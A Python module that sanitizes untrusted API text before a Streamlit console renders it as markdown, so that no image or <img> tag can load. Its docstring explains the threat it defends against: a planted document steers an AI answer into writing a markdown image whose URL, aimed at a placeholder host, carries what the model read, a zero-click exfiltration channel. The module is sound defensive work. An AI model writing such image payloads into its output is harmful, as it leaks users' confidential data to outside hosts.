"""
Text from the API made inert for the Streamlit console's markdown: no image,
ever (Decision 96).

Streamlit renders markdown — st.markdown, st.caption, the alert boxes, widget
and expander labels — and a markdown image loads the moment it is shown, with
no click. An answer steered by a planted document can write
`![](https://host/?q=<what it read>)`, and the console that displays it sends
that request: a zero-click channel out of the data room. Decision 76 closed it
in the web console by showing an image's alt text instead (AnswerPanel's `img`
override); answers never need images, and neither does anything else this
console shows from the API — claims, evidence quotes, the validator's notes,
file names, section headings, risk samples, ingest notices, the trace — so the
same policy applies to all of it here.

Three passes, the second a guarantee for markdown that does not depend on
the first:

1. Every inline (`![alt](url)`) and full or collapsed reference
   (`![alt][ref]`, `![alt][]`) image is replaced by its alt text, the
   destination or label dropped — what the web console shows.
2. Any `!` still directly before `[`, unescaped — a shortcut reference
   (`![ref]` with `[ref]: url` defined anywhere), an unclosed `![`, one that
   pass 1's replacements put next to each other — is backslash-escaped, so it
   prints and no image can start there.
3. Any unescaped `<img` or `<image` (HTML parses `<image>` as `<img>`) gets a
   backslash before the `<`, so markdown shows it as text.

This is not an HTML sanitizer. Inside an HTML block (from a line that opens
with `<div>` or the like to the next blank line) backslash escapes do not
apply: with unsafe_allow_html, `\\<img src=...>` there reaches the browser as a
tag, and other tags (video, svg, input, object) load addresses too. So a call
that allows HTML must html.escape its untrusted text first, as every one does
(each is listed in Decision 96's console follow-up); this function then
handles the markdown that still renders between the tags. Rendered with
micromark, the parser under Streamlit's markdown, 100,037 strings built from
these characters showed no image either way; inert_markdown alone under
unsafe_allow_html showed one for 118 of them, all inside an HTML block.

Everything else — emphasis, lists, tables, links (a click away, as in the web
console), the `\\$` of escape_currency — is left exactly as it was. Apply it as
the last step before the Streamlit call, after html.escape and escape_currency.
Known cosmetic cost: image syntax inside a code span is rewritten too.
"""

from __future__ import annotations

import re

# A line holding nothing but white space ends a paragraph, and with it any
# link or image: brackets do not pair across one.
_BLANK_LINE = re.compile(r"\n[ \t\r\f\v]*\n")
# `<image>` is parsed by HTML as `<img>`; `<imgx` is an unknown element.
_IMAGE_TAG = re.compile(r"<(?:img|image)\b", re.IGNORECASE)


def _pairs(text: str) -> tuple[dict[int, int], dict[int, int]]:
    """For every unescaped `[` and `(` that closes, the index of its `]` or `)`."""
    brackets: dict[int, int] = {}
    parens: dict[int, int] = {}
    open_brackets: list[int] = []
    open_parens: list[int] = []
    i, n = 0, len(text)
    while i < n:
        ch = text[i]
        if ch == "\\":
            i += 2
            continue
        if ch == "\n" and _BLANK_LINE.match(text, i):
            open_brackets.clear()
            open_parens.clear()
        elif ch == "[":
            open_brackets.append(i)
        elif ch == "]" and open_brackets:
            brackets[open_brackets.pop()] = i
        elif ch == "(":
            open_parens.append(i)
        elif ch == ")" and open_parens:
            parens[open_parens.pop()] = i
        i += 1
    return brackets, parens


def _images_as_alt_text(text: str) -> str:
    """Pass 1: inline and full or collapsed reference images become their alt text."""
    brackets, parens = _pairs(text)
    out: list[str] = []
    # The index of an image's closing "]" -> where its destination or label
    # ends. The alt text in between is scanned in place, so an image nested in
    # another's alt text is replaced too, in one pass.
    resume: dict[int, int] = {}
    i, n = 0, len(text)
    while i < n:
        if i in resume:
            i = resume.pop(i)
            continue
        ch = text[i]
        if ch == "\\":
            out.append(text[i:i + 2])
            i += 2
            continue
        if ch == "!" and text.startswith("[", i + 1) and i + 1 in brackets:
            close = brackets[i + 1]
            after = close + 1
            end = None
            if text.startswith("(", after) and after in parens:
                end = parens[after] + 1
            elif text.startswith("[", after) and after in brackets:
                end = brackets[after] + 1
            if end is not None:
                resume[close] = end
                i += 2
                continue
        out.append(ch)
        i += 1
    return "".join(out)


def _escape_what_could_load(text: str) -> str:
    """Passes 2 and 3: an unescaped `![`, `<img` or `<image` gets a backslash."""
    out: list[str] = []
    i, n = 0, len(text)
    while i < n:
        ch = text[i]
        if ch == "\\":
            out.append(text[i:i + 2])
            i += 2
            continue
        if (ch == "!" and text.startswith("[", i + 1)) or (ch == "<" and _IMAGE_TAG.match(text, i)):
            out.append("\\")
        out.append(ch)
        i += 1
    return "".join(out)


def inert_markdown(text) -> str:
    """
    `text` as markdown that shows no image and loads nothing.

    Args:
        text: Untrusted text bound for st.markdown, st.caption, an alert or a
            label — the API's answer, a claim, a file name. None is "".

    Returns:
        The same text with every image replaced by its alt text, and every
        place an image or an <img> tag could still start escaped. Idempotent.
    """
    if text is None:
        return ""
    return _escape_what_could_load(_images_as_alt_text(str(text)))
